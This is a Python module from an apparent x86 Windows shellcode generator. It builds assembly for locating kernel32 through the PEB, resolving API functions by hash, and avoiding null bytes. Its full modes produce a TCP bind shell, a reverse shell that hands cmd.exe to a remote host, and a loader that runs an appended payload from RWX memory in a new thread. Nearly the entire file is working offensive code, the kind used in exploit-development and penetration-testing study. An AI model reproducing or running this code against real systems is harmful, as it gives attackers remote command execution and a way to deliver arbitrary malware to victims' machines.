"""
Assembly block builders and high-level mode builders.

Mode builders return (asm_string, SlotAllocator).  The asm_string can be
passed directly to shellcode.assemble() or printed with --show-asm.
"""

import struct

from .hashing   import compute_hash
from .encoding  import stack_string_pushes
from .slots     import SlotAllocator
from .snippets  import (
    SNIPPET_STARTUPINFOA_SOCKET,
    SNIPPET_CMD_STRING,
    snippet_createprocessa,
    snippet_terminateprocess,
    snippet_wsa_init,
    snippet_wsa_socket_tcp,
    snippet_sockaddr_bind,
    snippet_bind_listen_accept,
    snippet_wsaconnect,
)


# ── Static core blocks ─────────────────────────────────────────────────────────

_PROLOGUE = """\
start:
    mov   ebp, esp                   # stack frame base
    add   esp, 0xfffff9f9            # avoid null bytes (equiv: sub esp, 0x607)"""

_FIND_KERNEL32 = """\
find_kernel32:
    xor   ecx, ecx                   # ECX = 0
    mov   esi, fs:[ecx+30h]          # ESI = &PEB (FS:0x30)
    mov   esi, [esi+0Ch]             # ESI = PEB->Ldr
    mov   esi, [esi+1Ch]             # ESI = Ldr.InInitializationOrderModuleList
next_module:
    mov   ebx, [esi+8h]              # EBX = module base address
    mov   edi, [esi+20h]             # EDI = module name (unicode)
    mov   esi, [esi]                 # ESI = next entry (flink)
    cmp   [edi+12*2], cx             # modulename[12] == 0? (kernel32.dll = 12 chars)
    jne   next_module                # keep walking"""

_FIND_FUNCTION_THUNK = """\
find_function_shorten:
    jmp   find_function_shorten_bnc
find_function_ret:
    pop   esi                        # address of find_function
    mov   [ebp+0x04], esi            # save at reserved slot [ebp+0x04]
    jmp   resolve_symbols_kernel32
find_function_shorten_bnc:
    call  find_function_ret          # CALL pushes find_function address; negative offset"""


def _find_function_asm(algo: str, rotation: int) -> str:
    """Emit the find_function routine with the correct hash operation."""
    if algo == 'ror':
        hash_ops = (
            f'    ror   edx, {hex(rotation):<8}           # ROR-{rotation}\n'
            f'    add   edx, eax                   # accumulate byte'
        )
    else:
        hash_ops = (
            f'    rol   edx, {hex(rotation):<8}           # ROL-{rotation}\n'
            f'    xor   edx, eax                   # XOR byte in'
        )
    return (
        'find_function:\n'
        '    pushad\n'
        '    mov   eax, [ebx+0x3c]            # e_lfanew\n'
        '    mov   edi, [ebx+eax+0x78]        # Export Table RVA\n'
        '    add   edi, ebx                   # Export Table VMA\n'
        '    mov   ecx, [edi+0x18]            # NumberOfNames\n'
        '    mov   eax, [edi+0x20]            # AddressOfNames RVA\n'
        '    add   eax, ebx                   # AddressOfNames VMA\n'
        '    mov   [ebp-4], eax               # save for loop\n'
        'find_function_loop:\n'
        '    jecxz find_function_finished\n'
        '    dec   ecx\n'
        '    mov   eax, [ebp-4]\n'
        '    mov   esi, [eax+ecx*4]           # export name RVA\n'
        '    add   esi, ebx                   # export name VMA\n'
        'compute_hash:\n'
        '    xor   eax, eax\n'
        '    cdq\n'
        '    cld\n'
        'compute_hash_again:\n'
        '    lodsb\n'
        '    test  al, al\n'
        '    jz    compute_hash_finished\n'
        f'{hash_ops}\n'
        '    jmp   compute_hash_again\n'
        'compute_hash_finished:\n'
        'find_function_compare:\n'
        '    cmp   edx, [esp+0x24]            # compare with requested hash\n'
        '    jnz   find_function_loop\n'
        '    mov   edx, [edi+0x24]            # AddressOfNameOrdinals RVA\n'
        '    add   edx, ebx\n'
        '    mov   cx,  [edx+2*ecx]           # ordinal\n'
        '    mov   edx, [edi+0x1c]            # AddressOfFunctions RVA\n'
        '    add   edx, ebx\n'
        '    mov   eax, [edx+4*ecx]           # function RVA\n'
        '    add   eax, ebx                   # function VMA\n'
        '    mov   [esp+0x1c], eax            # overwrite pushad EAX slot\n'
        'find_function_finished:\n'
        '    popad\n'
        '    ret'
    )


# ── Resolve block builders ─────────────────────────────────────────────────────

def build_resolve_block(func_names: list, algo: str, rotation: int,
                        slots: SlotAllocator,
                        label: str = 'resolve_symbols_kernel32') -> str:
    """
    Emit push/call/mov triplets for each function name.
    EBX must equal the target DLL base on entry.
    Slots are allocated in *slots* and the SlotAllocator is updated in place.
    """
    lines = [f'{label}:']
    for name in func_names:
        h    = compute_hash(name, algo, rotation)
        slot = slots.alloc(name)
        lines += [
            f'    push  {hex(h):<14}           # {name}',
            f'    call  dword ptr [ebp+0x04]       # find_function',
            f'    mov   [ebp+{hex(slot)}], eax            # save {name}',
        ]
    return '\n'.join(lines)


def build_load_and_resolve(dll: str, func_names: list, algo: str,
                            rotation: int, slots: SlotAllocator) -> str:
    """
    Load *dll* via LoadLibraryA then resolve *func_names* from it.
    LoadLibraryA must already be allocated in *slots* before calling this.
    After this block, EBX = loaded DLL base.
    """
    tag       = dll.replace('.', '_').replace('-', '_')
    load_slot = slots.slot('LoadLibraryA')
    lines     = [f'load_{tag}:']
    for line in stack_string_pushes(dll):
        lines.append(f'    {line}')
    lines += [
        f'    push  esp                        # pointer to "{dll}"',
        f'    call  dword ptr [ebp+{hex(load_slot)}]   # LoadLibraryA("{dll}")',
        f'resolve_{tag}:',
        '    mov   ebx, eax                   # EBX = loaded DLL base',
    ]
    for name in func_names:
        h    = compute_hash(name, algo, rotation)
        slot = slots.alloc(name)
        lines += [
            f'    push  {hex(h):<14}           # {name}',
            '    call  dword ptr [ebp+0x04]       # find_function',
            f'    mov   [ebp+{hex(slot)}], eax            # save {name}',
        ]
    return '\n'.join(lines)


def build_call_placeholder(func_names: list, slots: SlotAllocator) -> str:
    """
    Emit a call_function placeholder listing all resolved slots.
    The first name in *func_names* becomes the default call target.
    """
    slot_comments = '\n'.join(
        f'    # [ebp+{hex(slots.slot(n))}] = {n}' for n in func_names
    )
    primary = func_names[0]
    return (
        'call_function:\n'
        f'{slot_comments}\n'
        '    # Push arguments for your chosen function above, then:\n'
        f'    call  dword ptr [ebp+{hex(slots.slot(primary))}]    # {primary}'
    )


# ── Mode builders ──────────────────────────────────────────────────────────────

def custom_code(func_names: list, algo: str = 'ror', rotation: int = 13):
    """
    Resolve *func_names* from kernel32 and emit a call_function placeholder.

    Returns (asm_string, SlotAllocator).
    """
    slots    = SlotAllocator()
    sections = [
        _PROLOGUE,
        _FIND_KERNEL32,
        _FIND_FUNCTION_THUNK,
        _find_function_asm(algo, rotation),
        build_resolve_block(func_names, algo, rotation, slots),
        build_call_placeholder(func_names, slots),
    ]
    return '\n'.join(sections), slots


def bindshell_code(port: int, algo: str = 'ror', rotation: int = 13):
    """
    Full TCP bind shell on *port*.

    Assembly flow:
      prologue → find_kernel32 → find_function
      resolve kernel32: TerminateProcess, LoadLibraryA, CreateProcessA
      load + resolve ws2_32: WSAStartup, WSASocketA, bind, listen, accept
      WSAStartup → WSASocketA → sockaddr_in → bind → listen → accept
      STARTUPINFOA (socket handles) → cmd.exe → CreateProcessA → TerminateProcess

    Returns (asm_string, SlotAllocator).
    """
    slots    = SlotAllocator()
    sections = [
        _PROLOGUE,
        _FIND_KERNEL32,
        _FIND_FUNCTION_THUNK,
        _find_function_asm(algo, rotation),
        build_resolve_block(
            ['TerminateProcess', 'LoadLibraryA', 'CreateProcessA'],
            algo, rotation, slots),
        build_load_and_resolve(
            'ws2_32.dll',
            ['WSAStartup', 'WSASocketA', 'bind', 'listen', 'accept'],
            algo, rotation, slots),
        snippet_wsa_init(slots.slot('WSAStartup')),
        snippet_wsa_socket_tcp(slots.slot('WSASocketA')),
        snippet_sockaddr_bind(port),
        snippet_bind_listen_accept(
            slots.slot('bind'), slots.slot('listen'), slots.slot('accept')),
        SNIPPET_STARTUPINFOA_SOCKET,
        SNIPPET_CMD_STRING,
        snippet_createprocessa(slots.slot('CreateProcessA')),
        snippet_terminateprocess(slots.slot('TerminateProcess')),
    ]
    return '\n'.join(sections), slots


def revshell_code(lhost: str, lport: int, algo: str = 'ror', rotation: int = 13):
    """
    Full TCP reverse shell connecting to *lhost*:*lport*.

    Assembly flow:
      prologue → find_kernel32 → find_function
      resolve kernel32: TerminateProcess, LoadLibraryA, CreateProcessA
      load + resolve ws2_32: WSAStartup, WSASocketA, WSAConnect
      WSAStartup → WSASocketA → WSAConnect(lhost:lport)
      STARTUPINFOA (socket handles) → cmd.exe → CreateProcessA → TerminateProcess

    Returns (asm_string, SlotAllocator).
    """
    slots    = SlotAllocator()
    sections = [
        _PROLOGUE,
        _FIND_KERNEL32,
        _FIND_FUNCTION_THUNK,
        _find_function_asm(algo, rotation),
        build_resolve_block(
            ['TerminateProcess', 'LoadLibraryA', 'CreateProcessA'],
            algo, rotation, slots),
        build_load_and_resolve(
            'ws2_32.dll',
            ['WSAStartup', 'WSASocketA', 'WSAConnect'],
            algo, rotation, slots),
        snippet_wsa_init(slots.slot('WSAStartup')),
        snippet_wsa_socket_tcp(slots.slot('WSASocketA')),
        snippet_wsaconnect(lhost, lport, slots.slot('WSAConnect')),
        SNIPPET_STARTUPINFOA_SOCKET,
        SNIPPET_CMD_STRING,
        snippet_createprocessa(slots.slot('CreateProcessA')),
        snippet_terminateprocess(slots.slot('TerminateProcess')),
    ]
    return '\n'.join(sections), slots


# ── PI loader ──────────────────────────────────────────────────────────────────

# Placeholder immediate used in `add ebx, imm32` before patching.
# Must be > 0x7F to force a 6-byte imm32 encoding (not imm8), keeping the
# instruction size stable between the probe pass and the patch.
_LOADER_DELTA_PLACEHOLDER = 0xDEADBEEF


def _null_safe_push_imm(val: int, comment: str = '') -> str:
    """
    Return one or more assembly lines that push *val* onto the stack without
    embedding null bytes in the instruction stream.

    Handles the common cases that appear in loader constants:
      - no nulls              → plain push imm32
      - three trailing nulls  → xor eax / mov al / push eax
      - two trailing nulls    → xor eax / mov ax / push eax
      - one trailing null     → xor eax / 3× (mov al + shl) / push eax
      - embedded nulls        → warning comment + plain push (manual fix needed)
    """
    packed = struct.pack('<I', val & 0xFFFFFFFF)
    b      = list(packed)
    c      = f'                  # {comment}' if comment else ''
    nulls  = [i for i, x in enumerate(b) if x == 0]

    if not nulls:
        return f'    push  {hex(val)}{c}'

    lines = ['    xor   eax, eax']
    if nulls == [1, 2, 3]:
        lines += [f'    mov   al, {hex(b[0])}{c}', '    push  eax']
    elif nulls == [2, 3]:
        lines += [f'    mov   ax, {hex(b[0] | b[1] << 8)}{c}', '    push  eax']
    elif nulls == [3]:
        lines += [
            f'    mov   al, {hex(b[2])}',
            '    shl   eax, 0x08',
            f'    mov   al, {hex(b[1])}',
            '    shl   eax, 0x08',
            f'    mov   al, {hex(b[0])}{c}',
            '    push  eax',
        ]
    else:
        return (f'    # WARNING: embedded null in {hex(val)} ({comment}) — manual fix required\n'
                f'    push  {hex(val)}{c}')
    return '\n'.join(lines)


def loader_code(payload: bytes, algo: str = 'ror', rotation: int = 13):
    """
    Build a position-independent x86 shellcode loader with *payload* appended.

    Layout of the returned blob:
        [ loader shellcode ][ payload bytes ]

    The loader at runtime:
      1. Walks the PEB to find kernel32.dll
      2. Resolves VirtualAlloc, RtlMoveMemory, CreateThread, WaitForSingleObject
      3. Finds the payload address via a call/pop delta (position-independent)
      4. VirtualAlloc(RWX) → RtlMoveMemory(payload) → CreateThread → WaitForSingleObject

    The call/pop delta is computed by a one-pass assemble-then-patch strategy:
      - Assemble with placeholder 0xDEADBEEF in `add ebx, imm32`
      - Locate the placeholder bytes in the output
      - Patch them with the real delta (loader_size - offset_of_pop_ebx)
      - Append the raw payload bytes

    Returns (loader_blob: bytes, slots: SlotAllocator).
    """
    slots        = SlotAllocator()
    payload_size = len(payload)

    resolve_block = build_resolve_block(
        ['VirtualAlloc', 'RtlMoveMemory', 'CreateThread', 'WaitForSingleObject'],
        algo, rotation, slots,
    )

    va_slot  = slots.slot('VirtualAlloc')
    rtl_slot = slots.slot('RtlMoveMemory')
    ct_slot  = slots.slot('CreateThread')
    wso_slot = slots.slot('WaitForSingleObject')

    sections = [
        _PROLOGUE,
        _FIND_KERNEL32,
        _FIND_FUNCTION_THUNK,
        _find_function_asm(algo, rotation),
        resolve_block,

        # ── call/pop delta — EBX = payload address ──────────────────────────
        # After `pop ebx`, EBX = runtime address of _get_here.
        # `add ebx, DELTA` advances EBX to the first byte of the appended payload.
        # DELTA = loader_size - offset(_get_here).  Patched after assembly.
        f"""\
find_payload:
    call  _get_here
_get_here:
    pop   ebx                        # EBX = runtime addr of this label
    add   ebx, {hex(_LOADER_DELTA_PLACEHOLDER)}  # PATCHED: delta → payload start""",

        # ── VirtualAlloc(NULL, payload_size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
        # 0x3000 built without null bytes via push/pop/shl.
        # Payload size uses _null_safe_push_imm in case it contains zero bytes.
        f"""\
call_virtualalloc:
    xor   ecx, ecx                   # ecx = 0 (reused for NULL args)
    push  0x40                       # flProtect = PAGE_EXECUTE_READWRITE
    push  0x30                       # \\
    pop   eax                        #  > 0x3000 without null bytes
    shl   eax, 8                     # /  MEM_COMMIT | MEM_RESERVE
    push  eax
{_null_safe_push_imm(payload_size, 'dwSize = payload size')}
    push  ecx                        # lpAddress = NULL
    call  dword ptr [ebp+{hex(va_slot)}]    # VirtualAlloc -> EAX = RWX buffer
    mov   esi, eax                   # ESI = RWX buffer (preserved across calls)""",

        # ── RtlMoveMemory(RWX_buffer, payload_ptr, payload_size)
        f"""\
call_rtlmovememory:
{_null_safe_push_imm(payload_size, 'Length = payload size')}
    push  ebx                        # Source  = payload (EBX from call/pop)
    push  esi                        # Destination = RWX buffer
    call  dword ptr [ebp+{hex(rtl_slot)}]   # RtlMoveMemory""",

        # ── CreateThread(NULL,0,RWX_buffer,NULL,0,NULL) → EAX = thread handle
        f"""\
call_createthread:
    xor   ecx, ecx
    push  ecx                        # lpThreadId        = NULL
    push  ecx                        # dwCreationFlags   = 0
    push  ecx                        # lpParameter       = NULL
    push  esi                        # lpStartAddress    = RWX buffer
    push  ecx                        # dwStackSize       = 0
    push  ecx                        # lpThreadAttributes = NULL
    call  dword ptr [ebp+{hex(ct_slot)}]    # CreateThread -> EAX = thread handle""",

        # ── WaitForSingleObject(thread_handle, INFINITE)
        # 0xffffffff has no null bytes: FF FF FF FF
        f"""\
call_waitforsingleobject:
    push  0xffffffff                 # dwMilliseconds = INFINITE
    push  eax                        # hHandle = thread handle
    call  dword ptr [ebp+{hex(wso_slot)}]   # WaitForSingleObject""",
    ]

    code = '\n'.join(sections)

    # ── Assemble and patch ─────────────────────────────────────────────────────
    # Lazy import keeps keystone optional at import time.
    from .assembler import assemble as _asm
    loader_bytes = bytearray(_asm(code)[0])
    loader_size  = len(loader_bytes)

    # Locate `add ebx, 0xDEADBEEF` → encoded as: 81 C3 EF BE AD DE
    marker = bytes([0x81, 0xC3]) + struct.pack('<I', _LOADER_DELTA_PLACEHOLDER)
    pos    = loader_bytes.find(marker)
    if pos == -1:
        raise RuntimeError(
            'Loader delta placeholder not found in assembled output. '
            'Keystone may have optimised away the add instruction.'
        )

    # `pop ebx` is the single byte at pos-1.
    # After pop, EBX = runtime_addr(pos-1) = loader_base + (pos-1).
    # Payload starts at loader_base + loader_size.
    # → delta = loader_size - (pos - 1) = loader_size - pos + 1
    delta = loader_size - pos + 1
    loader_bytes[pos + 2 : pos + 6] = struct.pack('<I', delta)

    return bytes(loader_bytes) + bytes(payload), slots
